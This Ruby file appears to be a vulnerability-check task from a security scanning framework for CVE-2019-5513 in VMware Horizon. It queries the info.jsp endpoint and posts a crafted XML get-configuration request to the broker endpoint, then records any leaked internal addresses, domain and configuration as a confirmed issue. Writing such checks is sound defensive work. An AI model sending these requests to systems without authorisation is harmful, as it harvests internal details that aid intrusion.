module Intrigue
module Task
class VmwareHorizonInfoLeak < BaseTask

  def self.metadata
    {
      :name => "vuln/vmware_horizon_info_leak",
      :pretty_name => "Vuln - VMWare Horizon Info Leak",
      :authors => ["jcran", "hdm"],
      :identifiers => [{ "cve" =>  "CVE-2019-5513" }],
      :description => "Pull info from VMWare Horizon.",
      :references => [
        "https://www.atredis.com/blog/2019/3/15/cve-2019-5513-information-leaks-in-vmware-horizon"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [
        {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}
      ],
      :allowed_options => [],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    uri = _get_entity_name

    # Gather info from the info endpoint
    begin 
      info_data = JSON.parse(http_get_body("#{uri}/portal/info.jsp"))
    rescue JSON::ParserError => e 
      _log_error "Unable to parse data from #{uri}"
      info_data = nil
    end

    # Gather info from the broker endpoint    
    xml_request_data = "<?xml version=\'1.0\' encoding=\'UTF-8\'?><broker version=\'10.0\'><get-configuration></get-configuration></broker>"
    broker_response = http_request :post, "#{uri}/broker/xml", nil, {}, xml_request_data
    broker_data = broker_response.body if broker_response

    # create an issue
    if broker_data || info_data
      _create_issue({ 
        name: "Leaked VMWare Horizon Info on #{uri}", 
        type: "internal_information_leak",
        severity: 4,
        status: "confirmed",
        description: "This issue, described in CVE-2019-5513, allows an anonymous user to " + 
         " gather information about the internal IP address, domain, and configuration" +
         " of the system",
        details: { 
          cve: "CVE-2019-5513",
          uri: uri, 
          leaked_authentication_details: broker_data, 
          leaked_configuration_details: info_data }
      })
    end



  end

end
end
end
